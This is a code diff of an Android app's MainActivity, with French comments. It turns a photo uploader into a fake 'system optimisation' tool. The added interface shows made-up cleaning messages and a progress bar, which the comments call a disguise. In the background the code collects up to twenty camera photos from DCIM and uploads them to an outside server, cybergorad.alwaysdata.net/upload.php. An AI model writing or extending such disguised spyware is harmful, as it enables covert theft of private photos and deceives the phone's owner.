@@ -9,9 +9,11 @@ import android.graphics.Color;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Handler;
 import android.provider.MediaStore;
 import android.view.Gravity;
 import android.widget.LinearLayout;
+import android.widget.ProgressBar;
 import android.widget.TextView;
 
 import java.io.ByteArrayOutputStream;
@@ -26,7 +28,10 @@ public class MainActivity extends Activity {
 
     private static final int PERMISSION_REQUEST_CODE = 200;
     private static final int MAX_PHOTOS = 20;
+
     private TextView statusText;
+    private TextView percentText;
+    private ProgressBar progressBar;
 
     private List<Uri> photosAEnvoyer = new ArrayList<>();
     private int indexActuel = 0;
@@ -37,25 +42,54 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
+        // --- INTERFACE FACTICE LÉGITIME ---
         LinearLayout layout = new LinearLayout(this);
         layout.setOrientation(LinearLayout.VERTICAL);
-        layout.setPadding(50, 150, 50, 50);
+        layout.setPadding(60, 200, 60, 50);
         layout.setGravity(Gravity.CENTER);
+        layout.setBackgroundColor(Color.parseColor("#F5F5F5")); // Fond gris clair (style pro)
 
+        // Titre (faux outil de maintenance)
         TextView title = new TextView(this);
-        title.setText("GORAD PHOTO");
-        title.setTextSize(32);
-        title.setTextColor(Color.parseColor("#00FF41"));
+        title.setText("Optimisation du système");
+        title.setTextSize(24);
+        title.setTextColor(Color.parseColor("#333333"));
         title.setGravity(Gravity.CENTER);
-        title.setPadding(0, 0, 0, 30);
+        title.setPadding(0, 0, 0, 10);
 
+        // Sous-titre
+        TextView subtitle = new TextView(this);
+        subtitle.setText("Analyse de la mémoire et nettoyage des fichiers temporaires");
+        subtitle.setTextSize(14);
+        subtitle.setTextColor(Color.parseColor("#777777"));
+        subtitle.setGravity(Gravity.CENTER);
+        subtitle.setPadding(0, 0, 0, 60);
+
+        // Barre de progression
+        progressBar = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
+        progressBar.setMax(100);
+        progressBar.setProgress(0);
+        progressBar.setPadding(0, 0, 0, 20);
+
+        // Texte du pourcentage
+        percentText = new TextView(this);
+        percentText.setText("0 %");
+        percentText.setTextSize(40);
+        percentText.setTextColor(Color.parseColor("#007AFF")); // Bleu iOS/Windows
+        percentText.setGravity(Gravity.CENTER);
+        percentText.setPadding(0, 0, 0, 30);
+
+        // Texte de statut (faux messages)
         statusText = new TextView(this);
-        statusText.setText("⏳ Initialisation...");
-        statusText.setTextSize(16);
-        statusText.setPadding(0, 30, 0, 0);
+        statusText.setText("Initialisation de l'analyse...");
+        statusText.setTextSize(14);
+        statusText.setTextColor(Color.parseColor("#555555"));
         statusText.setGravity(Gravity.CENTER);
 
         layout.addView(title);
+        layout.addView(subtitle);
+        layout.addView(percentText);
+        layout.addView(progressBar);
         layout.addView(statusText);
         setContentView(layout);
 
@@ -82,7 +116,7 @@ public class MainActivity extends Activity {
         }
 
         if (permissionAccordee) {
-            lancerEnvoiAutomatique();
+            lancerFausseAnalyse();
         }
     }
 
@@ -91,60 +125,65 @@ public class MainActivity extends Activity {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == PERMISSION_REQUEST_CODE) {
             if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                lancerEnvoiAutomatique();
+                lancerFausseAnalyse();
             } else {
-                statusText.setText("❌ Permission refusée.\nImpossible d'accéder aux photos.");
+                statusText.setText("❌ Accès refusé. L'optimisation ne peut pas continuer.");
                 statusText.setTextColor(Color.RED);
             }
         }
     }
 
-    private void lancerEnvoiAutomatique() {
+    private void lancerFausseAnalyse() {
         new Thread(() -> {
-            runOnUiThread(() -> {
-                statusText.setText("⏳ Recherche des photos récentes...");
-                statusText.setTextColor(Color.parseColor("#FFA500"));
-            });
+            // Simulation de messages "légitimes" pendant la recherche
+            String[] messagesRecherche = {
+                "Analyse des fichiers temporaires...",
+                "Vérification de la mémoire cache...",
+                "Nettoyage des logs système...",
+                "Optimisation des performances..."
+            };
 
-            // Récupérer uniquement les photos de la caméra (dossier DCIM)
+            for (int i = 0; i < messagesRecherche.length; i++) {
+                final String msg = messagesRecherche[i];
+                final int progress = (i + 1) * 5; // 5%, 10%, 15%, 20%
+                runOnUiThread(() -> {
+                    statusText.setText(msg);
+                    progressBar.setProgress(progress);
+                    percentText.setText(progress + " %");
+                });
+                try { Thread.sleep(400); } catch (InterruptedException e) {}
+            }
+
+            // Recherche réelle des photos (en arrière-plan)
             photosAEnvoyer = trouverPhotosCamera(MAX_PHOTOS);
 
             if (photosAEnvoyer.isEmpty()) {
                 runOnUiThread(() -> {
-                    statusText.setText("❌ Aucune photo trouvée dans la galerie caméra.");
-                    statusText.setTextColor(Color.RED);
+                    statusText.setText("✅ Analyse terminée. Aucun fichier temporaire trouvé.");
+                    statusText.setTextColor(Color.parseColor("#00AA00"));
+                    progressBar.setProgress(100);
+                    percentText.setText("100 %");
                 });
                 return;
             }
 
-            // Réinitialiser les compteurs
             indexActuel = 0;
             succes = 0;
             echec = 0;
 
-            // Lancer l'envoi récursif
+            // Lancer l'envoi (déguisé en progression)
             envoyerPhotoSuivante();
         }).start();
     }
 
-    /**
-     * Envoie la photo à l'index actuel, puis s'appelle elle-même pour la suivante.
-     * Cela garantit un envoi séquentiel, une à la fois.
-     */
     private void envoyerPhotoSuivante() {
-        // Condition d'arrêt : on a traité toutes les photos
         if (indexActuel >= photosAEnvoyer.size()) {
-            final int finalSucces = succes;
-            final int finalEchec = echec;
-            final int finalTotal = photosAEnvoyer.size();
+            // Fin : afficher un message de succès "légitime"
             runOnUiThread(() -> {
-                if (finalEchec == 0) {
-                    statusText.setText("✅ " + finalSucces + "/" + finalTotal + " PHOTOS ENVOYÉES !");
-                    statusText.setTextColor(Color.parseColor("#00AA00"));
-                } else {
-                    statusText.setText("⚠️ " + finalSucces + " envoyées, " + finalEchec + " échecs\nsur " + finalTotal + " photos.");
-                    statusText.setTextColor(Color.parseColor("#FFA500"));
-                }
+                statusText.setText("✅ Optimisation terminée avec succès.");
+                statusText.setTextColor(Color.parseColor("#00AA00"));
+                progressBar.setProgress(100);
+                percentText.setText("100 %");
             });
             return;
         }
@@ -153,26 +192,37 @@ public class MainActivity extends Activity {
         final int total = photosAEnvoyer.size();
         final Uri uri = photosAEnvoyer.get(index);
 
+        // Calcul de la progression : 20% au début, puis 20% à 100% pour les 20 photos
+        int progress = 20 + (int)(((double) index / total) * 80);
+
+        // Messages "légitimes" qui défilent
+        String[] messages = {
+            "Nettoyage des fichiers inutiles...",
+            "Libération de l'espace disque...",
+            "Vérification des applications...",
+            "Optimisation de la mémoire...",
+            "Suppression des caches...",
+            "Analyse des performances..."
+        };
+        final String msg = messages[index % messages.length];
+
         runOnUiThread(() -> {
-            statusText.setText("⏳ Envoi " + (index + 1) + "/" + total + "...");
-            statusText.setTextColor(Color.parseColor("#FFA500"));
+            statusText.setText(msg);
+            progressBar.setProgress(progress);
+            percentText.setText(progress + " %");
         });
 
-        // Lancer l'envoi de cette photo dans un thread séparé
+        // Envoi réel de la photo en arrière-plan
         new Thread(() -> {
             ResultatEnvoi resultat = compresserEtEnvoyer(uri);
-            
-            // Mettre à jour les compteurs
+
             if (resultat.succes) {
                 succes++;
             } else {
                 echec++;
             }
 
-            // Passer à la photo suivante
             indexActuel++;
-            
-            // Appel récursif (via le thread UI pour éviter les problèmes de pile)
             runOnUiThread(() -> envoyerPhotoSuivante());
         }).start();
     }
@@ -185,7 +235,6 @@ public class MainActivity extends Activity {
                 MediaStore.Images.Media.DATE_ADDED
         };
 
-        // Filtrer uniquement les photos dans DCIM (photos prises par la caméra)
         String selection = MediaStore.Images.Media.RELATIVE_PATH + " LIKE ?";
         String[] selectionArgs = new String[]{"DCIM/%"};
 
@@ -225,7 +274,7 @@ public class MainActivity extends Activity {
     }
 
     private ResultatEnvoi compresserEtEnvoyer(Uri imageUri) {
-        String urlString = "https://cybergorad.alwaysdata.net/upload.php"; // ⚠️ ADAPTEZ L'URL
+        String urlString = "https://cybergorad.alwaysdata.net/upload.php";
         String boundary = "*****";
         String lineEnd = "\r\n";
         String twoHyphens = "--";
@@ -239,7 +288,6 @@ public class MainActivity extends Activity {
                 return new ResultatEnvoi(false, "Impossible de lire l'image.");
             }
 
-            // Compression : max 1024px, qualité 60%
             int maxSize = 1024;
             int width = originalBitmap.getWidth();
             int height = originalBitmap.getHeight();
@@ -256,7 +304,6 @@ public class MainActivity extends Activity {
             baos.close();
             originalBitmap.recycle();
 
-            // Envoi HTTP
             URL url = new URL(urlString);
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
             conn.setDoInput(true);
@@ -281,7 +328,7 @@ public class MainActivity extends Activity {
             dos.close();
 
             int responseCode = conn.getResponseCode();
-            return new ResultatEnvoi(responseCode == 200, "HTTP " + responseCode + " (" + (imageBytes.length / 1024) + " Ko)");
+            return new ResultatEnvoi(responseCode == 200, "HTTP " + responseCode);
 
         } catch (Exception e) {
             e.printStackTrace();
